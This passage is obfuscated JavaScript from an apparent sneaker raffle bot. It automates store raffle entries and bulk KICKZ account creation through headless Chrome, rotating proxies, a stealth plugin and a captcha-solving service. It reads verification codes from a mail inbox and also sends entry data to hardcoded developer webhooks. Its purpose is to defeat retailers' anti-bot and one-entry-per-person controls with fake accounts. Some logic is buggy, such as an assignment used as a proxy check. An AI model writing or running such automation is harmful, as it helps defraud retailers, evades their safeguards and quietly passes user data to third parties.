                    if (_0x4a18d0[_0x1f48df]['Email'] == '' || _0x4a18d0[_0x1f48df]['Url'] == '' || _0x4a18d0[_0x1f48df]['FirstName'] == '' || _0x4a18d0[_0x1f48df]['LastName'] == '') {
                        console['log'](_0x34a417() + '\x20[' + _0x469829[taskModule]['name'] + ']\x20Task\x20' + (_0x1f48df + 0x1) + '\x20:\x20Invalid\x20CSV');
                        continue;
                    }
                    if (_0x395552['useRandomProxy'] = ![])
                        var _0xaa90e8 = _0x465cb6[_0x1f48df]['split'](':');
                    else
                        var _0x32fb90 = Math['round'](Math['random']() * (_0x465cb6['length'] - 0x1)), _0xaa90e8 = _0x465cb6[_0x32fb90]['split'](':');
                    var _0x17adec;
                    try {
                        _0x17adec = await _0x3430c5['launch']({
                            'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0xaa90e8[0x0] + ':' + _0xaa90e8[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                    } catch {
                        _0x17adec = await _0x3430c5['launch']({
                            'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0xaa90e8[0x0] + ':' + _0xaa90e8[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                    }
                    try {
                        const _0x2bfb28 = await _0x17adec['newPage']();
                        await _0x2bfb28['authenticate']({
                            'username': '' + _0xaa90e8[0x2],
                            'password': '' + _0xaa90e8[0x3]
                        }), console['log'](_0x34a417() + '\x20[' + _0xa6a07b['name'] + ']\x20Task\x20' + (_0x1f48df + 0x1) + '\x20:\x20Getting\x20Session'), await _0x2bfb28['setRequestInterception'](!![]), _0x2bfb28['on']('request', _0x2ff8b8 => {
                            _0x2ff8b8['resourceType']() === 'image' || _0x2ff8b8['resourceType']() === 'font' || _0x2ff8b8['resourceType']() === 'media' ? _0x2ff8b8['abort']() : _0x2ff8b8['continue']();
                        });
                        try {
                            await _0x2bfb28['goto']('' + _0x4a18d0[_0x1f48df]['Url'], {
                                'waitUntil': 'networkidle2',
                                'timeout': 0xea60
                            });
                        } catch {
                            throw new Error('Connection\x20Error');
                        }
                        try {
                            await _0x2bfb28['waitForSelector']('#comp_firstname', { 'timeout': 0x7530 });
                        } catch {
                            throw new Error('Not\x20an\x20Active\x20Raffle');
                        }
                        console['log'](_0x34a417() + '\x20[' + _0xa6a07b['name'] + ']\x20Task\x20' + (_0x1f48df + 0x1) + '\x20:\x20Filling\x20Information'), await _0x2bfb28['type']('#comp_firstname', '' + _0x4a18d0[_0x1f48df]['FirstName']), await _0x2bfb28['waitForSelector']('#comp_lastname'), await _0x2bfb28['type']('#comp_lastname', '' + _0x4a18d0[_0x1f48df]['LastName']), await _0x2bfb28['waitForSelector']('#comp_email'), await _0x2bfb28['type']('#comp_email', '' + _0x4a18d0[_0x1f48df]['Email']), await _0x2bfb28['waitForSelector']('#comp_paypalemail'), await _0x2bfb28['type']('#comp_paypalemail', '' + _0x4a18d0[_0x1f48df]['Email']), await _0x2bfb28['waitForSelector']('#comp_mobile_end'), await _0x2bfb28['type']('#comp_mobile_end', '' + _0x4a18d0[_0x1f48df]['Phone']), await _0x2bfb28['waitForSelector']('#comp_dob'), await _0x2bfb28['type']('#comp_dob', '08/09/1992'), console['log'](_0x34a417() + '\x20[' + _0xa6a07b['name'] + ']\x20Task\x20' + (_0x1f48df + 0x1) + '\x20:\x20Choosing\x20Size');
                        if (_0x4a18d0[_0x1f48df]['Size'] == 'RANDOM') {
                            const _0x48d4e1 = await _0x2bfb28['$$eval']('select[id=\x22shoesize\x22]\x20>\x20option', _0x5421e0 => {
                                return _0x5421e0['map'](_0x34d803 => _0x34d803['value']);
                            });
                            var _0x831e0d = Math['round'](Math['random']() * (_0x48d4e1['length'] - 0x2));
                            await _0x2bfb28['select']('#shoesize', _0x48d4e1[_0x831e0d + 0x1]), await _0x17175c(0x3e8);
                        } else {
                            const _0x1229bb = await _0x2bfb28['$$eval']('select[id=\x22shoesize\x22]\x20>\x20option', _0x19c560 => {
                                return _0x19c560['map'](_0x2d9e5c => _0x2d9e5c['innerText']);
                            }), _0x470ea6 = await _0x2bfb28['$$eval']('select[id=\x22shoesize\x22]\x20>\x20option', _0x2b7133 => {
                                return _0x2b7133['map'](_0x4ccf60 => _0x4ccf60['value']);
                            });
                            var _0x149f09 = _0x4a18d0[_0x1f48df]['Size'];
                            for (var _0x432451 = 0x1; _0x432451 < _0x470ea6['length']; _0x432451++) {
                                var _0x18d355 = _0x1229bb[_0x432451]['split']('\x20')[0x0];
                                if (_0x18d355 == _0x149f09) {
                                    await _0x2bfb28['select']('#shoesize', _0x470ea6[_0x432451]);
                                    break;
                                } else {
                                    if (_0x432451 + 0x1 == _0x470ea6['length'])
                                        throw new Error('Size\x20Not\x20Found..');
                                }
                            }
                        }
                        await _0x2bfb28['waitForSelector']('#comp_address1'), await _0x2bfb28['type']('#comp_address1', _0x4a18d0[_0x1f48df]['Address1'] + '\x20' + _0x4a18d0[_0x1f48df]['HouseNumber']), await _0x2bfb28['waitForSelector']('#comp_address2'), await _0x2bfb28['type']('#comp_address2', '' + _0x4a18d0[_0x1f48df]['Address2']), await _0x2bfb28['waitForSelector']('#comp_address2'), await _0x2bfb28['type']('#comp_address3', '' + _0x4a18d0[_0x1f48df]['City']), await _0x2bfb28['waitForSelector']('#comp_postcode'), await _0x2bfb28['type']('#comp_postcode', '' + _0x4a18d0[_0x1f48df]['Zip']), console['log'](_0x34a417() + '\x20[' + _0xa6a07b['name'] + ']\x20Task\x20' + (_0x1f48df + 0x1) + '\x20:\x20Sending\x20Entry'), await _0x17175c(0x4b0), await _0x2bfb28['click']('label#emailhold'), await _0x17175c(0x5dc), await _0x2bfb28['click']('#preauth_tandc_email\x20>\x20label'), await _0x17175c(0x5dc), await _0x2bfb28['click']('#submit');
                        try {
                            await _0x2bfb28['waitForSelector']('#paymentWrap');
                        } catch {
                            throw new Error('Could\x20not\x20find\x20Payment');
                        }
                        console['log'](_0x34a417() + '\x20[' + _0xa6a07b['name'] + ']\x20Task\x20' + (_0x1f48df + 0x1) + '\x20:\x20' + _0x1446ca['blue']('Awaiting\x20Paypal\x20Payment')), _0x17adec['on']('targetcreated', async _0x3583f9 => {
                            if (_0x3583f9['type']() === 'page') {
                                const _0x5f05da = await _0x3583f9['page']();
                                async function _0x5cc7df() {
                                    try {
                                        await _0x2bfb28['waitForSelector']('#error_message', { 'timeout': 0x493e0 }), _0x2a33c4 = !![];
                                        return;
                                    } catch {
                                    }
                                }
                                async function _0x7d5808() {
                                    try {
                                        await _0x2bfb28['waitForSelector']('#successMessage', { 'timeout': 0x493e0 }), _0x5914f6 = !![];
                                        return;
                                    } catch {
                                    }
                                }
                                _0x7d5808(), _0x5cc7df(), await _0x17175c(0x493e0);
                            }
                        });
                        async function _0x2dcd0c() {
                            for (let _0x20e384 = 0x0; _0x20e384 < 0x12c; _0x20e384++) {
                                if (_0x5914f6 == !![]) {
                                    _0x9293af = 'no', _0x12263c(_0x4a18d0[_0x1f48df], _0xa6a07b), console['log'](_0x1446ca['green'](_0x34a417() + '\x20[' + _0xa6a07b['name'] + ']\x20Task\x20' + (_0x1f48df + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                                    if (_0x395552['webhook'] != undefined && _0x395552['webhook'] != '')
                                        try {
                                            await _0x17b782(_0x395552['webhook'], _0x340102['succesDEVMSG']);
                                        } catch {
                                        }
                                    await _0x17175c(0xc8), await _0x17b782(_0x2b6dac, _0x340102['succesDEVMSG']), await _0x17175c(0xc8);
                                    try {
                                        await _0x17b782(_0xd9f2b8, _0x340102['succesPUBMSG']);
                                    } catch {
                                    }
                                    return;
                                } else {
                                    if (_0x2a33c4)
                                        throw new Error('Paypal\x20Error:\x20Target\x20closed');
                                    else
                                        await _0x17175c(0x3e8);
                                }
                            }
                            throw new Error('Paypal\x20Error');
                        }
                        await _0x17175c(0xbb8), await _0x2bfb28['click']('.zoid-outlet'), await _0x17175c(0x7d0), await _0x2dcd0c();
                    } catch (_0x44b4a8) {
                        console['log'](_0x1446ca['red'](_0x34a417() + '\x20[' + _0xa6a07b['name'] + ']\x20Task\x20' + (_0x1f48df + 0x1) + '\x20:\x20' + _0x44b4a8)), _0xf6aee = '' + _0x44b4a8;
                        var _0x38f64d = await _0x262703(_0x4a18d0[_0x1f48df], _0xa6a07b, 'dev', !![], _0xf6aee);
                        _0x340102['errorDEV'] = { 'embeds': [_0x38f64d] }, _0x395552['webhook'] != undefined && _0x395552['webhook'] != '' && await _0x17b782(_0x395552['webhook'], _0x340102['errorDEV']), await _0x17b782(_0x40c5c7, _0x340102['errorDEV']);
                    } finally {
                        _0x17adec && _0x17adec['close']();
                        if (_0x9293af == 'yes' && _0x10bace != 0x5 && _0xf6aee != 'Size\x20Not\x20Found') {
                            console['log'](_0x1446ca['red'](_0x34a417() + '\x20[' + _0xa6a07b['name'] + ']\x20Task\x20' + (_0x1f48df + 0x1) + '\x20:\x20Retrying\x20(' + _0x10bace + '\x20/\x205)')), _0x1f48df = _0x1f48df - 0x1, _0x10bace = _0x10bace + 0x1;
                            continue;
                        }
                        _0x9293af == 'yes' && _0x10bace >= 0x5 && (_0x2848bf(afew[_0x1f48df], _0xa6a07b), _0x9293af = 'no', _0x10bace = 0x0), console['log']('Waiting\x20for\x20' + _0x395552['delay'] + '\x20ms'), await _0x17175c(_0x395552['delay']);
                    }
                }
            }
        }]
    },
    {
        'name': 'KICKZ',
        'modules': [
            {
                'name': 'KICKZ\x20Account\x20Generator',
                'store': 'KICKZ',
                'logo': 'https://scontent-ams2-1.cdninstagram.com/v/t51.2885-19/240479500_928777121004310_8721482303708952556_n.jpg?stp=dst-jpg_s320x320&_nc_ht=scontent-ams2-1.cdninstagram.com&_nc_cat=1&_nc_ohc=9H1DnW3bwMAAX-W7Mo2&edm=AOQ1c0wBAAAA&ccb=7-5&oh=00_AfDjR8EqgPUyl8iQgx56K_94mx_vSIRsFkQbyEq02-zAUQ&oe=63E0E147&_nc_sid=8fd12b',
                'function': async function (_0x24a438, _0x3bee22, _0x1a2284) {
                    _0x3430c5['use'](_0x5c6730()), _0x3430c5['use'](_0x4fb3d8({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x395552['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x44b3d1 = 0x0; _0x44b3d1 < _0x3bee22['length']; _0x44b3d1++) {
                        const _0x542614 = 'https://www.kickz.com/login';
                        if (_0x4dcc44 != 'yes')
                            var _0x4dcc44 = '', _0x15085c = 0x0;
                        _0xe0def5(_0x24a438['name'] + '\x20Task\x20' + (_0x44b3d1 + 0x1) + '\x20/\x20' + _0x3bee22['length'] + '\x20||\x20File:\x20' + _0x1946fb + '\x20Proxies:\x20' + _0x487348);
                        try {
                            await _0x195de7(_0x3bee22, _0x44b3d1);
                        } catch {
                            _0x4dcc44 = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        var _0x4eb2b2 = [{
                            'type': 'rich',
                            'title': 'Succesful\x20Kickz\x20Account\x20Generated',
                            'description': '',
                            'color': 0xc0d6d6,
                            'fields': [
                                {
                                    'name': 'User',
                                    'value': '' + _0x25f505
                                },
                                {
                                    'name': 'Delay',
                                    'value': '' + _0x395552['delay']
                                },
                                {
                                    'name': 'Version',
                                    'value': '' + _0x5e7c75
                                }
                            ]
                        }];
                        const _0x316ccf = { 'embeds': _0x4eb2b2 };
                        var _0x3333b5 = await _0x262703(_0x3bee22[_0x44b3d1], _0x24a438, 'acc', ![]);
                        const _0x12337c = { 'succesDEVMSG': { 'embeds': [_0x3333b5] } };
                        if (_0x3bee22[_0x44b3d1]['Email'] == '' || _0x3bee22[_0x44b3d1]['FirstName'] == '' || _0x3bee22[_0x44b3d1]['LastName'] == '') {
                            console['log'](_0x34a417() + '\x20[' + _0x24a438['name'] + ']\x20Task\x20' + (_0x44b3d1 + 0x1) + '\x20:\x20Invalid\x20CSV');
                            continue;
                        }
                        _0x3bee22[_0x44b3d1]['Password'] == '' && (_0x3bee22[_0x44b3d1]['Password'] = 'JRaffles23!');
                        if (_0x395552['useRandomProxy'] = ![])
                            var _0x5ff320 = _0x1a2284[_0x44b3d1]['split'](':');
                        else
                            var _0x1adcae = Math['round'](Math['random']() * (_0x1a2284['length'] - 0x1)), _0x5ff320 = _0x1a2284[_0x1adcae]['split'](':');
                        var _0x2bd5da;
                        try {
                            _0x2bd5da = await _0x3430c5['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x5ff320[0x0] + ':' + _0x5ff320[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x2bd5da = await _0x3430c5['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x5ff320[0x0] + ':' + _0x5ff320[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0xa73330 = await _0x2bd5da['newPage']();
                            await _0xa73330['authenticate']({
                                'username': '' + _0x5ff320[0x2],
                                'password': '' + _0x5ff320[0x3]
                            }), console['log'](_0x34a417() + '\x20[' + _0x24a438['name'] + ']\x20Task\x20' + (_0x44b3d1 + 0x1) + '\x20:\x20Getting\x20Session'), await _0xa73330['setRequestInterception'](!![]), _0xa73330['on']('request', _0x870599 => {
                                _0x870599['resourceType']() === 'image' || _0x870599['resourceType']() === 'font' || _0x870599['resourceType']() === 'media' ? _0x870599['abort']() : _0x870599['continue']();
                            }), await _0xa73330['goto'](_0x542614), await _0x17175c(0xbb8), console['log'](_0x34a417() + '\x20[' + _0x24a438['name'] + ']\x20Task\x20' + (_0x44b3d1 + 0x1) + '\x20:\x20Starting\x20Registration'), await _0xa73330['waitForSelector']('#consent-dialog\x20>\x20section\x20>\x20button'), await _0xa73330['click']('#consent-dialog\x20>\x20section\x20>\x20button'), await _0xa73330['waitForSelector']('#button-register'), await _0x17175c(0x7d0), await _0xa73330['evaluate'](() => {
                                const _0x1d7723 = document['querySelector']('#button-register');
                                _0x1d7723['click']();
                            }), console['log'](_0x34a417() + '\x20[' + _0x24a438['name'] + ']\x20Task\x20' + (_0x44b3d1 + 0x1) + '\x20:\x20Setting\x20Credentials'), await _0x17175c(0x1388), await _0xa73330['waitForSelector']('#customer_salutation'), await _0xa73330['select']('#customer_salutation', 'mr'), await _0x17175c(0x7d0), await _0xa73330['waitForSelector']('#customer_firstname'), await _0xa73330['type']('#customer_firstname', '' + _0x3bee22[_0x44b3d1]['FirstName']), await _0x17175c(0x352), await _0xa73330['waitForSelector']('#customer_lastname'), await _0xa73330['type']('#customer_lastname', '' + _0x3bee22[_0x44b3d1]['LastName']), await _0x17175c(0x352), await _0xa73330['type']('#email-input', '' + _0x3bee22[_0x44b3d1]['Email']), await _0x17175c(0x352), await _0xa73330['type']('#email-confirm-input', '' + _0x3bee22[_0x44b3d1]['Email']), await _0x17175c(0x352), await _0xa73330['type']('#register-password', '' + _0x3bee22[_0x44b3d1]['Password']), await _0x17175c(0x352), await _0xa73330['type']('#password-confirm', '' + _0x3bee22[_0x44b3d1]['Password']), await _0x17175c(0x352), console['log'](_0x34a417() + '\x20[' + _0x24a438['name'] + ']\x20Task\x20' + (_0x44b3d1 + 0x1) + '\x20:\x20Sending\x20Credentials'), await _0xa73330['click']('#consent'), await _0x17175c(0x1f4);
                            const _0xfde277 = await _0xa73330['$']('div.inputErrorMsg.b-form_section-message');
                            if (_0xfde277) {
                                console['log'](_0x1446ca['red'](_0x34a417() + '\x20[' + _0x24a438['name'] + ']\x20Task\x20' + (_0x44b3d1 + 0x1) + '\x20:\x20Your\x20password\x20must\x20contain\x20at\x20least\x20one\x20uppercase\x20&\x20one\x20lowercase\x20letter,\x20one\x20number\x20and\x20one\x20special\x20character.'));
                                continue;
                            }
                            await _0xa73330['click']('#buttonRegister');
                            try {
                                await _0xa73330['waitForSelector']('#verificationCode');
                            } catch {
                                throw new Error('Account\x20already\x20registered');
                            }
                            console['log'](_0x34a417() + '\x20[' + _0x24a438['name'] + ']\x20Task\x20' + (_0x44b3d1 + 0x1) + '\x20:\x20A\x20verification\x20code\x20has\x20been\x20sent\x20to\x20' + _0x3bee22[_0x44b3d1]['Email']), await _0x17175c(0x4b0);
                            async function _0x4b31d7() {
                                var _0x58d4cd, _0x453094 = ![];
                                for (var _0x3d816c = 0x0; _0x3d816c < 0x18; _0x3d816c++) {
                                    async function _0x5855f5() {
                                        var _0x1b172f = new _0x550e5b({
                                            'user': _0x395552['masterMail'],
                                            'password': _0x395552['masterPassword'],
                                            'host': 'imap.gmail.com',
                                            'port': 0x3e1,
                                            'tls': !![],
                                            'autotls': 'always'
                                        });
                                        function _0x4745ab(_0x1d2b96) {
                                            _0x1b172f['openBox']('INBOX', ![], _0x1d2b96);
                                        }
                                        _0x1b172f['once']('ready', function () {
                                            console['log'](_0x34a417() + '\x20[' + _0x24a438['name'] + ']\x20Task\x20' + (_0x44b3d1 + 0x1) + '\x20:\x20Opened\x20Mailbox'), _0x4745ab(function (_0xb6e296, _0x3cb313) {
                                                console['log'](_0x34a417() + '\x20[' + _0x24a438['name'] + ']\x20Task\x20' + (_0x44b3d1 + 0x1) + '\x20:\x20Looking\x20for\x20verification\x20mail');
                                                if (_0xb6e296)
                                                    throw _0xb6e296;
                                                _0x1b172f['seq']['search']([
                                                    'UNSEEN',
                                                    [
                                                        'FROM',
                                                        'verification@kickz.com'
                                                    ]
                                                ], function (_0x5a4296, _0x29035b) {
                                                    if (!_0x29035b || !_0x29035b['length'])
                                                        console['log'](_0x34a417() + '\x20[' + _0x24a438['name'] + ']\x20No\x20mail\x20found,\x20retrying\x20in\x205\x20seconds'), _0x1b172f['end']();
                                                    else {
                                                        var _0x5e3c21 = _0x1b172f['seq']['fetch'](_0x29035b, {
                                                            'bodies': '',
                                                            'markSeen': !![]
                                                        });
                                                        _0x5e3c21['on']('message', function (_0x1f9b36, _0x542dcc) {
                                                            var _0x269d3b = '(#' + _0x542dcc + ')\x20';
                                                            _0x1f9b36['on']('body', function (_0x12c41a, _0x31412d) {
                                                                _0x169414(_0x12c41a, (_0x297542, _0x473ce7) => {
                                                                    if (_0x473ce7['subject'] == 'Kickz\x20Account\x20Verification\x20Code') {
                                                                        var _0x353f19 = _0x473ce7['html']['split']('<div\x20style=\x22display:block;font-family:Arial,sans-serif;font-size:\x2030px;font-weight:\x20600;line-height:24px;color:#333333\x22>'), _0x25c4ef = _0x353f19[0x1]['split']('<')[0x0];
                                                                        _0x58d4cd = _0x25c4ef;
                                                                    }
                                                                });
                                                            }), _0x1f9b36['once']('end', function () {
                                                            });
                                                        }), _0x5e3c21['once']('error', function (_0x96b032) {
                                                            console['log']('No\x20mail\x20found,\x20retrying\x20in\x205\x20seconds..');
                                                        }), _0x5e3c21['once']('end', function () {
                                                            _0x1b172f['end']();
                                                        });
                                                    }
                                                });
                                            });
                                        }), _0x1b172f['once']('error', function (_0x558831) {
                                            console['log'](_0x1446ca['red'](_0x558831['message'])), console['log']('Read\x20the\x20guide\x20on\x20how\x20to\x20setup\x20your\x20mailbox'), _0x453094 = !![];
                                        }), _0x1b172f['once']('end', async function () {
                                        }), _0x1b172f['connect']();
                                    }
                                    _0x5855f5(), await _0x17175c(0x1388);
                                    if (_0x58d4cd)
                                        return _0x58d4cd;
                                    if (_0x453094)
                                        throw new Error('Error\x20connecting\x20to\x20imap');
                                    if (_0x3d816c == 0x18)
                                        throw new Error('Mail\x20not\x20found');
                                }
                            }
                            ;
                            code = await _0x4b31d7(), _0x17175c(0x320), console['log'](_0x34a417() + '\x20[' + _0x24a438['name'] + ']\x20Task\x20' + (_0x44b3d1 + 0x1) + '\x20:\x20Verifying..'), await _0xa73330['type']('#verificationCode', code), await _0x17175c(0x1f4), await _0xa73330['click']('#buttonVerify'), await _0x17175c(0x190), await _0xa73330['click']('#buttonVerify'), await _0x17175c(0x3e8);
                            try {
                                await _0xa73330['waitForSelector']('div.b-user_greeting'), _0x4dcc44 = 'no', console['log'](_0x1446ca['green'](_0x34a417() + '\x20[' + _0x24a438['name'] + ']\x20Task\x20' + (_0x44b3d1 + 0x1) + '\x20:\x20Account\x20' + _0x3bee22[_0x44b3d1]['Email'] + '\x20Generated\x20&\x20Verified!')), _0x2e1301['appendFileSync']('../accounts/kickz-verified.csv', '\x0a' + _0x3bee22[_0x44b3d1]['Email'] + ',' + _0x3bee22[_0x44b3d1]['Password'] + ','), console['log'](_0x34a417() + '\x20[' + _0x24a438['name'] + ']\x20Task\x20' + (_0x44b3d1 + 0x1) + '\x20:\x20Account\x20' + _0x3bee22[_0x44b3d1]['Email'] + '\x20Saved\x20in\x20\x27accounts/kickz-verified.csv\x27');
                                try {
                                    _0x395552['webhook'] != undefined && _0x395552['webhook'] != '' && await _0x17b782(_0x395552['webhook'], _0x12337c['succesDEVMSG']);
                                } catch {
                                }
                                await _0x17b782(_0x30a02b, _0x12337c['succesDEVMSG']);
                            } catch {
                                _0x4dcc44 = 'no', console['log'](_0x1446ca['red'](_0x34a417() + '\x20[' + _0x24a438['name'] + ']\x20Task\x20' + (_0x44b3d1 + 0x1) + '\x20:\x20Verification\x20failed')), console['log'](_0x1446ca['red'](_0x34a417() + '\x20[' + _0x24a438['name'] + ']\x20Task\x20' + (_0x44b3d1 + 0x1) + '\x20:\x20Account\x20saved\x20in\x20\x27accounts/kickz-unverified.csv\x27'));
                            }
                        } catch (_0x199f17) {
                            console['log'](_0x1446ca['red'](_0x34a417() + '\x20[' + _0x24a438['name'] + ']\x20Task\x20' + (_0x44b3d1 + 0x1) + '\x20:\x20' + _0x199f17)), _0x4eb2b2[0x0]['title'] = 'Failed\x20kickz\x20Acc\x20Gen', _0x4eb2b2[0x0]['description'] = '' + _0x199f17, await _0x17b782(_0x40c5c7, _0x316ccf), _0x4dcc44 = 'yes';
                        } finally {
                            _0x2bd5da && _0x2bd5da['close']();
                            if (_0x4dcc44 == 'yes' && _0x15085c != 0x5) {
                                console['log'](_0x1446ca['red'](_0x34a417() + '\x20[' + _0x24a438['name'] + ']\x20Task\x20' + (_0x44b3d1 + 0x1) + '\x20:\x20Retrying\x20(' + _0x15085c + '\x20/\x205)')), _0x44b3d1 = _0x44b3d1 - 0x1, _0x15085c = _0x15085c + 0x1;
                                continue;
                            }
                            _0x4dcc44 == 'yes' && _0x15085c >= 0x5 && (_0x2848bf(_0x3bee22[_0x44b3d1], _0x24a438), _0x4dcc44 = 'no', _0x15085c = 0x0), console['log']('Waiting\x20for\x20' + _0x395552['delay'] + '\x20ms'), await _0x17175c(_0x395552['delay']);
                        }
                    }
                }
            },
            {
                'name': 'KICKZ\x20Raffle\x20Entries',
                'store': 'KICKZ',
                'logo': 'https://scontent-ams2-1.cdninstagram.com/v/t51.2885-19/240479500_928777121004310_8721482303708952556_n.jpg?stp=dst-jpg_s320x320&_nc_ht=scontent-ams2-1.cdninstagram.com&_nc_cat=1&_nc_ohc=9H1DnW3bwMAAX-W7Mo2&edm=AOQ1c0wBAAAA&ccb=7-5&oh=00_AfDjR8EqgPUyl8iQgx56K_94mx_vSIRsFkQbyEq02-zAUQ&oe=63E0E147&_nc_sid=8fd12b',
                'function': async function (_0x16cc5c, _0x3df488, _0x4cfae8) {
                    _0x3430c5['use'](_0x5c6730()), _0x3430c5['use'](_0x4fb3d8({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x395552['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x20fec0 = 0x0; _0x20fec0 < _0x3df488['length']; _0x20fec0++) {
                        var _0x5eb4da;
                        if (_0x1eb098 != 'yes')
                            var _0x1eb098 = '', _0x44dc55 = 0x0;
                        _0xe0def5(_0x16cc5c['name'] + '\x20Task\x20' + (_0x20fec0 + 0x1) + '\x20/\x20' + _0x3df488['length'] + '\x20||\x20File:\x20' + _0x1946fb + '\x20Proxies:\x20' + _0x487348);
                        var _0x344725 = [{
                            'type': 'rich',
                            'title': 'Succesful\x20Kickz\x20Entry',
                            'description': '',
                            'color': 0xc0d6d6,
                            'fields': [
                                {
                                    'name': 'User',
                                    'value': '' + _0x25f505
                                },
                                {
                                    'name': 'Product',
                                    'value': '' + _0x3df488[_0x20fec0]['Url']
                                },
                                {
                                    'name': 'Size',
                                    'value': '' + _0x3df488[_0x20fec0]['Size']
                                },
                                {
                                    'name': 'Delay',
                                    'value': '' + _0x395552['delay']
                                },
                                {
                                    'name': 'Version',
                                    'value': '' + _0x5e7c75
                                }
                            ]
                        }], _0xdaf8c7 = await _0x262703(_0x3df488[_0x20fec0], _0x16cc5c, 'dev', ![]), _0xdaea18 = await _0x262703(_0x3df488[_0x20fec0], _0x16cc5c, 'pub', ![]);
                        const _0x1df56f = {
                            'succesDEVMSG': { 'embeds': [_0xdaf8c7] },
                            'succesPUBMSG': { 'embeds': [_0xdaea18] }
                        };
                        try {
                            await _0x195de7(_0x3df488, _0x20fec0);
                        } catch {
                            _0x1eb098 = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        if (_0x3df488[_0x20fec0]['Email'] == '' || _0x3df488[_0x20fec0]['Password'] == '' || _0x3df488[_0x20fec0]['FirstName'] == '' || _0x3df488[_0x20fec0]['LastName'] == '') {
                            console['log'](_0x34a417() + '\x20[' + _0x16cc5c['name'] + ']\x20Task\x20' + (_0x20fec0 + 0x1) + '\x20:\x20Invalid\x20CSV');
                            continue;
                        }
                        if (_0x395552['useRandomProxy'] = ![])
                            var _0x5b3db1 = _0x4cfae8[_0x20fec0]['split'](':');
                        else
                            var _0x173d1b = Math['round'](Math['random']() * (_0x4cfae8['length'] - 0x1)), _0x5b3db1 = _0x4cfae8[_0x173d1b]['split'](':');
                        var _0x2cc405;
                        try {
                            _0x2cc405 = await _0x3430c5['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !!![],
                                'args': [
                                    '--proxy-server=' + _0x5b3db1[0x0] + ':' + _0x5b3db1[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x2cc405 = await _0x3430c5['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !!![],
                                'args': [
                                    '--proxy-server=' + _0x5b3db1[0x0] + ':' + _0x5b3db1[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x504900 = await _0x2cc405['newPage']();
                            await _0x504900['authenticate']({
                                'username': '' + _0x5b3db1[0x2],
                                'password': '' + _0x5b3db1[0x3]
                            }), console['log'](_0x34a417() + '\x20[' + _0x16cc5c['name'] + ']\x20Task\x20' + (_0x20fec0 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x504900['setRequestInterception'](!![]), _0x504900['on']('request', _0x32a0f3 => {
                                _0x32a0f3['resourceType']() === 'image' || _0x32a0f3['resourceType']() === 'font' || _0x32a0f3['resourceType']() === 'media' ? _0x32a0f3['abort']() : _0x32a0f3['continue']();
                            }), await _0x504900['goto']('' + _0x3df488[_0x20fec0]['Url'], { 'waitUntil': 'networkidle2' }), await _0x17175c(0x12c), await _0x504900['waitForSelector']('#consent-dialog\x20>\x20section\x20>\x20button'), await _0x504900['click']('#consent-dialog\x20>\x20section\x20>\x20button'), await _0x17175c(0x7d0);
                            try {
                                await _0x504900['click']('a[title=\x22Sign\x20In\x22]');
                            } catch {
                                await _0x504900['click']('a[title=\x22sign\x20in\x22]');
                            }
                            console['log'](_0x34a417() + '\x20[' + _0x16cc5c['name'] + ']\x20Task\x20' + (_0x20fec0 + 0x1) + '\x20:\x20Logging\x20in'), await _0x504900['waitForSelector']('#username'), await _0x504900['type']('#username', _0x3df488[_0x20fec0]['Email']), await _0x504900['waitForSelector']('#password'), await _0x504900['type']('#password', _0x3df488[_0x20fec0]['Password']), await _0x17175c(0x190), await _0x504900['click']('#buttonSubmit'), await _0x504900['waitForSelector']('.b-variation_swatch-value_overlay'), console['log'](_0x34a417() + '\x20[' + _0x16cc5c['name'] + ']\x20Task\x20' + (_0x20fec0 + 0x1) + '\x20:\x20Getting\x20Product'), await _0x17175c(0x1f4), console['log'](_0x34a417() + '\x20[' + _0x16cc5c['name'] + ']\x20Task\x20' + (_0x20fec0 + 0x1) + '\x20:\x20Choosing\x20size\x20' + _0x3df488[_0x20fec0]['Size']);
                            let _0x166ef9 = _0x3df488[_0x20fec0]['Size']['replace']('.5', '\x201/2');
                            if (_0x166ef9['toUpperCase']() == 'RANDOM') {
                                const _0x1902e0 = await _0x504900['$$']('.b-variations_item-content.m-list\x20>\x20button');
                                var _0x172efa = Math['round'](Math['random']() * (_0x1902e0['length'] - 0x1));
                                await _0x1902e0[_0x172efa]['click']();
                            } else
                                await _0x504900['click']('button[aria-label=\x22' + _0x166ef9 + '\x22]');
                            await _0x17175c(0x1f4);
                            try {
                                await _0x504900['click']('button[data-tau=\x22add_new_address\x22]');
                            } catch {
                            }
